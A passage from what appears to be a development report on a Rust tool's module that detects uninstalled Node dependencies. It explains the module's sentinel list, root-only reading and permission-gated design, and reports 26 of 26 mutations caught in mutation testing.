  `m19` moves the severity the evidence carries, and `m20` unbinds the evidence
  from the fingerprint the walk was taken over.

- **The table has one row, and both omissions are argued rather than left as an
  unfinished table.** Rust is out because there is no gap to find — `cargo test`
  fetches what it needs when it runs, so an absent `target` is where the next
  command is going to write rather than a state to fix first — and `checks/rust.rs`
  argues this at length and declines to carry an install step for the same reason.
  Python is out because absence settles nothing, and that is the more interesting
  omission: where a Python check runs is composed by `discover::python::command_for`,
  and a project without an installer gets `python -m pytest`, which the discovery
  itself calls *"a command that depends on which interpreter is first on the
  path"* (`discover/python.rs:1596`). An interpreter first on the path is not in
  the project, so a walk of the project cannot see it, and a project with no
  `.venv` may have every one of its packages importable. **The honest reason there
  is no Python row is that SURE cannot tell — not that Python projects do not need
  installing**, and `the_table_holds_only_the_ecosystems_absence_settles_for` is
  the test that holds the table to that answer.

- **The sentinel list is generous on purpose, and the generosity is the safety
  argument.** This module's one productive finding is an absence, so a sentinel
  missing from `resolved_into` is a project SURE wrongly tells to install packages
  it already has, while a sentinel that should not have been there costs a
  **suppressed** finding — the quiet direction. So the row names `node_modules`
  **and** Yarn's `.pnp.cjs`/`.pnp.js`, because a plug'n'play project resolves
  packages with no `node_modules` at all and leaving them out would produce a
  finding on every PnP project in existence.
  `a_yarn_plug_n_play_project_has_no_node_modules_and_is_not_a_finding` holds that,
  and it is also the half that exercises the walk's **entries** rather than its
  **skips**. What is deliberately absent is a cache: `SkipReason` already separates
  `Vendored` from `Cache`, and a download a package manager is holding for later
  resolves nothing on its own. `m11` drops the PnP sentinels, `m12` drops
  `node_modules` — the widest catch list in the set at 7 — and `m13` points the
  claim at the wrong manifest.

- **Only the root is read.** npm, yarn and pnpm hoist a workspace's packages into
  the **root** `node_modules`, so a member with none of its own is the normal shape
  of a correctly-installed monorepo, and reading members would produce a finding on
  every one of them. The rule is equality with the root rather than a search under
  it — `packages/web/node_modules` folds to a longer path and does not equal
  `node_modules` without a second rule saying so —
  `a_member_directory_is_not_the_root_and_does_not_answer_for_it` holds that, and
  `m9` turns the equality into an `ends_with` and is caught only by it.

- **Nothing here installs and nothing here can be made to.** `Assessed::action` is
  `ActionKind::InstallDependencies` — a **function** rather than a field, because
  there is exactly one answer and a field would be a second place for it to be
  written down wrong — and it is the value `ExecutionRequirements::of` turns into a
  decision and `consent` turns into a question, so a caller goes through the same
  door every other action goes through. What this module does **not** do is compose
  the command: that is `crate::checks`' business and lives there, from the same
  `ConventionalCommand` the checks are built from. **The table has no column for a
  command at all**, which is what makes that a structural fact rather than a
  promise, and `the_module_opens_no_file_and_runs_nothing` makes the reading half
  of it a source rule in the shape `db_migrations` uses for its own.

**One unit test was deleted rather than the guard widened to admit it, and that is
the decision this task most nearly got wrong.** `check_schedule`'s proposer rule
scans every shipped source file and fails when one names `CheckProposal`,
`CheckReason`, `ExecutionRequirements` or `PlanBuilder` outside prose — and **it
does not cut at `#[cfg(test)]`**, so a unit test in a shipped file is a proposer
for this rule. The first draft's unit test
(`the_action_an_install_needs_is_the_one_permission_that_never_comes_free`) named
`ExecutionRequirements` to measure that inspect-only refuses an install. Adding
`dependency_state.rs` to `MAY_PROPOSE` would have weakened a real guard **and**
asserted something false about a module that proposes nothing; the test was also
redundant, because the integration test already makes the same claim over a real
`Assessed`. Its one missing assertion —
`permissions_needed() == vec![Permission::InstallDependencies]` — moved into
`an_install_is_a_separate_action_that_needs_its_own_permission`, where it sits
beside the `blocked_by(&ExecutionPermissions::inspect_only())` assertion that is
the second sentence of the acceptance.

**The mutation set is 26 rows over the one source file this task adds, 26 caught,
0 survivors, 0 inconclusive, every restore verified by blob hash — and every row
ran the same 1253-test suite.** The filter is empty for every row, so a survivor
would be a mutation the whole crate's suite missed rather than one a narrow filter
never looked at, and the internal check is exact rather than approximate: **43
result lines in every row, and `passed + caught = 1253` in every row**, so the only
number that moved across the 26 runs is the catch count. The tree measured is the
tree committed, checked by hash rather than assumed: every row reports the same
pre-run blob `f67a0937…`, which is what `git hash-object` gave for the committed
file.

- **Two mutations were considered and deliberately not written, because both are
  equivalent mutants no test in this suite could see.** The
  `.unwrap_or(row.declared_in)` fallback in `evidence_of` is unreachable from a
  table whose `resolved_into` is non-empty — and
  `the_first_sentinel_is_the_directory_a_check_for_node_reads_from` asserts that
  for every row — so any replacement of it changes nothing. Reversing the
  `resolved_into` traversal in `Dependencies::met` changes nothing either, because
  no fixture in the suite has two sentinels present at once, so first-found and
  last-found are the same sentinel in every run. **A survivor that means nothing is
  worse than a row that was never written**, and the *answers* both rows would have
  moved are held by name elsewhere — the first sentinel by the unit test, and the
  anchor by `declared_packages_and_no_installed_tree_is_the_one_claim_this_module
  _makes`. This is `P4-T006`'s and `P4-T007`'s equivalent-mutant finding arriving a
  third time, and the third time the answer was to not write the row at all.

- **One row is platform-dependent, and it says so rather than being left to read as
  a survivor.** `m10` removes the case fold from the sentinel lookup
  (`CaseSensitivity::platform()` → `Sensitive`). It is observable on this
  machine's case-insensitive filesystem and exercised on the other by CI, where the
  same code path answers the opposite way — the same shape `P4-T007` recorded for
  its own `m13`. `the_case_a_sentinel_is_looked_up_by_is_the_platforms_rule`
  asserts whichever answer the platform gives, so it is caught here **and** would
  be caught there; a mutation whose effect depends on the platform is not the same
  thing as one nothing can see, and the difference is that this one can name the
  test that sees it. The lookup goes through `discover::lookup_key` rather than a
  second folding rule written here, for the reason `P4-T007` recorded.

**What this task does not do, stated where the module states it.** It does not
install anything, and it never composes the command that would; it does not read a
manifest to find out what the packages *are*, only whether the walk met the place
an install would have put them; it does not decide whether a project's declared
packages are the right ones, or current, or resolvable; and it does not look inside
a dependency tree it finds — a `node_modules` that exists is the end of the
question rather than the beginning of one. The reading it produces is for a caller
holding a failing check, and the module's job ends at handing that caller
`Reading::TheDependencies` and a sentence that says what SURE did not do.
